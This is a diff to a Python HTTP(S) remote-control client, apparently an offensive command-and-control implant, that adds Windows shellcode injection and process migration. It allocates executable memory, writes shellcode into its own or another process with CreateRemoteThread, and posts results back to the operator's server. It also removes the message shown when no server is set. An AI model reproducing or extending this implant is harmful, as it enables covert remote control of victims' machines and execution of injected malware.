@@ -2,12 +2,13 @@
 # -*- coding: utf-8 -*-
 
 __author__      = 'Christophoros Petrou (game0ver)'
-__version__     = '1.0'
+__version__     = '1.1'
 
 import os
 import re
 import sys
 import socket
+import platform
 import warnings
 import subprocess
 from base64 import (
@@ -28,19 +29,33 @@ from argparse import (
     ArgumentTypeError,
     RawTextHelpFormatter
 )
+from ctypes import *
 from random import randint
 from requests import Session
 from requests.exceptions import *
 warnings.filterwarnings("ignore")
 
 special_commands = ["upload", "download"]
-chg_dir = re.compile(r'^cd (.*)$')
-unix_path = re.compile(r'^(.+/)*([^/]+)$')
-wind_path = re.compile(r'^(.+\\)*([^/]+)$')
+chg_dir    = re.compile(r'^cd (.*)$')
+unix_path  = re.compile(r'^(.+/)*([^/]+)$')
+wind_path  = re.compile(r'^(.+\\)*([^/]+)$')
 screenshot = re.compile(r'^screenshot\s*$')
+migrate    = re.compile(r'^migrate\s+(\d+)\s*$')
+inject     = re.compile(r'^inject\s+shellcode\s*$')
+
+# windows only
+PAGE_EXECUTE_READWRITE = 0x00000040
+PROCESS_ALL_ACCESS     = 0x001F0FFF
+VIRTUAL_MEM            = ( 0x00001000 | 0x00002000 )
+try:
+    kernel32 = windll.kernel32
+except NameError:
+    pass
 
 CERT = None
 SERVER = None
+shellcode = ""
+
 
 def console():
     parser = ArgumentParser(description="{}client.py:{} An HTTP(S) client with advanced features.".format('\033[1m', '\033[0m'),
@@ -133,6 +148,45 @@ def exec_cmd(cmd):
     return cmd_output.communicate()
 
 
+def is_os_64bit():
+    return platform.machine().endswith('64')
+
+
+def inject_shellcode():
+    try:
+        arg_address = kernel32.VirtualAlloc(0, len(shellcode), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
+        kernel32.RtlMoveMemory(arg_address, shellcode, len(shellcode))
+        thrd = kernel32.CreateThread(0, 0, arg_address, 0, 0, 0)
+        kernel32.WaitForSingleObject(thrd,-1)
+        return True
+    except Exception as error:
+        return error
+
+
+def migrate_res(pid, retcode):
+    result = {
+        1 : "Shellcode successfully injected on PID: {} ".format(pid),
+        2 : "Couldn't acquire a handle to PID: {}".format(pid),
+        3 : "Failed to inject shellcode on process with PID: {} ".format(pid)
+    }
+    return result[retcode]
+
+
+def migrate_to_pid(pid):
+    """
+    this function is inspired & adapted from the "GRAY HAT PYTHON" book.
+    """
+    try:
+        h_process  = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
+        if not h_process:
+            return 2
+        arg_address = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
+        kernel32.WriteProcessMemory(h_process, arg_address, shellcode, len(shellcode), byref(c_int(0)))
+        return 3 if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(c_ulong(0))) else 1
+    except Exception as error:
+        return 3
+
+
 username, error = exec_cmd("whoami")
 if os.name=='nt':
     username = username.decode('utf-8').split('\\')[1]
@@ -158,7 +212,6 @@ try:
         SERVER = args.server
     else:
         if not SERVER:
-            print("An HTTP(S) server must be specified.")
             sys.exit(0)
     with Session() as s:
         if args.proxy:
@@ -241,6 +294,30 @@ try:
                             s.post(SERVER, data='ERROR: Pillow module is not installed')
                         except Exception as screenshot_error:
                             s.post(SERVER, data=screenshot_error)
+                    elif inject.match(cmd):
+                        if os.name == 'nt':
+                            if not is_os_64bit():
+                                if shellcode:
+                                    res = inject_shellcode()
+                                    if res:
+                                        s.post(SERVER, data="Shellcode injected successfully...")
+                                    else:
+                                        s.post(SERVER, data=error)
+                                else:
+                                    s.post(SERVER, data='No shellcode specified...')
+                        else:
+                            s.post(SERVER, data='For now "inject shellcode" command is available only for 32bit-windows systems.')
+                    elif migrate.match(cmd):
+                        if os.name == 'nt':
+                            if not is_os_64bit():
+                                if shellcode:
+                                    pid = migrate.search(cmd).group(1)
+                                    res = migrate_to_pid(pid)
+                                    s.post(SERVER, data=migrate_res(pid, res))
+                                else:
+                                    s.post(SERVER, data='No shellcode specified...')
+                        else:
+                            s.post(SERVER, data='For now "migrate" command is available only for 32bit-windows systems.')
                     else:
                         try:
                             stdout, stderr = exec_cmd(cmd)
